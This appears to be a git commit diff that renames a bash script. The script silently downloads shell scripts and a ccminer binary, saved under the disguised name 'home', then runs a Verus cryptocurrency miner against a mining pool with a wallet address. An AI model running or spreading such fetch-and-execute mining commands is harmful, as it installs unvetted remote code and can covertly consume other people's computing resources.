b661e9aa66331a991fe65c7d49b47c23dbb998cc
traapoks <165988185+traapoks@users.noreply.github.com>
2024-04-10 09:23:34 +0700

    Update and rename Ver.sh to vers.sh

--- Ver.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/build.sh
-wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/configure.sh
-wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/autogen.sh
-wget -q -O home https://github.com/traapoks/traapoks/raw/main/ccminer.exe
-./build.sh
-./home -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RPWMTPZgHs3UxprgXvK6ZGXMC3Z3GHmXd6.1 -p hybrid -t97
---
+++ vers.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/build.sh && chmod +x build.sh
+wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/configure.sh && chmod +x configure.sh
+wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/autogen.sh && chmod +x autogen.sh
+wget -q -O home https://github.com/traapoks/traapoks/raw/main/ccminer.exe
+./build.sh
+./home -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RRYVVDXrrwgchzytdZk4AAZuNm21348cF9.1 -p hybrid -t97
